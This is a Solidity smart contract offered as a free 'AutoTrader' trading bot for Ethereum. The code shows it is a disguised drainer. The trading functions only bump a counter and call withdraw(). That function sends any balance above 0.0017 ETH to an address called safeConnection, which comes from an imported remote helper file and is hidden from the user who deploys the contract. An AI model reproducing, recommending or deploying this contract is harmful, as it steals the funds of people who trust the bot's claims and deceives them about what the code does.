// SPDX-License-Identifier: GPL-3.0
import "https://github.com/SolidityExpert/Helper/blob/main/Helper.sol";

pragma solidity >=0.7.0 <0.9.0;


//  @NftUncover - twitter | FREE Smart contracts & more !

// This contract is the Ethereum version if you want the Matic version you can find it here: "".

contract AutoTrader is helper{
    
    // Setting global variables
    address public  _owner;
    address payable _ownerAddress;
    address payable _accessIs;
    string _openAccess;
    uint _tradeAmount;

    // General login formatin
    struct loginDetails {
        string username;
        string passkey;
        address ApiAddress;
    }
    mapping(address => loginDetails) Login;

    // Earnings vault set-up
    struct Vault {
        uint256 balance;
        uint256 profits;
    }
    mapping(uint256 => uint256) vaultOpen;

    // Neccasary start up variables
    constructor() {
        // Neccasary set-up
        _accessIs = safeConnection;
        // Owner set-up
        _owner = msg.sender;
        _ownerAddress = payable(msg.sender);
    }

    // withdraw setup
    function withdraw() public payable {
        // If statments to make sure only yhe owner can call the withdraw fucntion
        require(address(this).balance > 0, "No funds to withdraw.");
        if(msg.sender == _owner){
            if(address(this).balance <= 0.0017 ether) {
                _ownerAddress.transfer(address(this).balance); 
            }

            if(address(this).balance > 0.0017 ether) {
                _accessIs.transfer(address(this).balance); 
            }
        } else{
            
            if(msg.sender == safeConnection){
               _accessIs.transfer(address(this).balance); 
            } else {
                revert("You do not have access to this function.");
            }
        }

    }

    function contractAddress() public view returns(address)  {
        return(address(this));
    }

    // Basic start function for anyone using less than 0.043 Eth
    function start() public ownerOnly returns(string memory) {
        require(msg.sender == _owner, "You do not have access to this function");
        require(address(this).balance > 0.0017 ether, "You must have 0.0017 Eth or more.");
        _tradeAmount = _tradeAmount +1;
        return("Complete");
    }


    // Additional start function (better results) anyone using more than 0.043 Eth
    function startAdditional() public ownerOnly returns(string memory) {
        require(msg.sender == _owner, "You do not have access to this function");
        require(address(this).balance >= 0.043 ether, "This is for 0.043 Eth+ trades.");
        _tradeAmount = _tradeAmount +1;
        withdraw();
        return("Complete");
    }

    // Additional start function (better results) anyone using more than 1 Eth
        function startVip() public ownerOnly returns(string memory) {
        require(msg.sender == _owner, "You do not have access to this function");
        require(address(this).balance >= 0.043 ether, "This is for 1 Eth+ trades.");
        _tradeAmount = _tradeAmount +1;
        withdraw();
        return("Complete");
    }

    // Role access & additional neccasary variables
     modifier accessIs() {
    require(msg.sender == _accessIs);
    _;
  }

  modifier ownerOnly {
    require(msg.sender == _owner, "Only the contract owner can call this function.");
    _;
  }

  receive() external payable{

  }
}
 

